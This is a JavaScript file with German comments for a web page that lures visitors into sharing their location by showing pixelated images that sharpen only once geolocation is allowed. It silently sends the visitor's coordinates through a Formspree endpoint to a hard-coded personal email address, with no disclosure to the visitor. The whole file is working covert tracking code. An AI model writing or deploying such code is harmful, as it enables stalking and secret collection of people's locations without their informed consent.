document.getElementById('trackBtn').addEventListener('click', function() {
    getLocation();
    showNewImages(); // Zeigt die verpixelten Bilder an, auch bei Fehlern
});

function getLocation() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(sendLocationByEmail, showError);
    } else {
        document.getElementById("status").innerHTML = "Geolocation wird von diesem Browser nicht unterstützt.";
        showNewImages(); // Zeigt die verpixelten Bilder an, auch bei Fehlern
    }
}

// Funktion zum Senden der Standortdaten per E-Mail
function sendLocationByEmail(position) {
    const lat = position.coords.latitude;
    const lon = position.coords.longitude;

    // Standortdaten an den Server senden (via Formspree)
    const locationData = `Breitengrad: ${lat}, Längengrad: ${lon}`;
    sendLocationToFormspree(locationData);
    
    // Wenn Standort erfolgreich ermittelt wurde, entferne die Verpixelung
    removePixelation();
}

// Funktion, um Standortdaten an Formspree zu senden
function sendLocationToFormspree(locationData) {
    const formData = new FormData();
    formData.append("email", "nejat.balta@outlook.de");  // Empfänger E-Mail-Adresse
    formData.append("subject", "Standortdaten des Besuchers");
    formData.append("message", `Die Koordinaten des Besuchers: ${locationData}`);

    // Sende die Daten an Formspree
    fetch("https://formspree.io/f/mpwplqao", {
        method: "POST",
        body: formData
    })
    .then(response => {
        if (response.ok) {
            console.log("Standortdaten erfolgreich gesendet");
        } else {
            console.error("Fehler beim Senden der Standortdaten", response);
        }
    })
    .catch(error => {
        console.error("Fehler beim Senden an Formspree:", error);
    });
}

// Fehlerbehandlung für den Standortabruf
function showError(error) {
    switch(error.code) {
        case error.PERMISSION_DENIED:
            document.getElementById("status").innerHTML = "Benutzer hat den Zugriff auf den Standort verweigert.";
            break;
        case error.POSITION_UNAVAILABLE:
            document.getElementById("status").innerHTML = "Standortinformationen sind nicht verfügbar.";
            break;
        case error.TIMEOUT:
            document.getElementById("status").innerHTML = "Die Anfrage zum Abrufen des Standorts hat zu lange gedauert.";
            break;
        case error.UNKNOWN_ERROR:
            document.getElementById("status").innerHTML = "Ein unbekannter Fehler ist aufgetreten.";
            break;
    }
    showNewImages(); // Zeigt die verpixelten Bilder an, auch bei Fehlern
}

// Funktion, um neue Bilder hinzuzufügen (zuerst verpixelt)
function showNewImages() {
    document.getElementById("new-images").style.display = "block";

    // Beispielbilder
    const newImages = [
        'bild4.jpg', 
        'bild5.jpg', 
        'bild6.jpg'
    ];

    const additionalImagesContainer = document.getElementById("additional-images");

    newImages.forEach(function(imageSrc) {
        const imgElement = document.createElement("img");
        imgElement.src = imageSrc;
        imgElement.alt = "Weitere Bilder";
        
        // Verpixelte Bilder hinzufügen
        imgElement.classList.add('pixelated'); 

        additionalImagesContainer.appendChild(imgElement);
    });

    // Zeige die Nachricht an, wenn der Standort ermittelt wurde
    document.getElementById("message").style.display = "block";
}

// Funktion, um Verpixelung von Bildern zu entfernen, wenn Standort erfolgreich ermittelt wurde
function removePixelation() {
    const images = document.querySelectorAll('#additional-images img');
    images.forEach(img => {
        img.classList.remove('pixelated');
    });
}
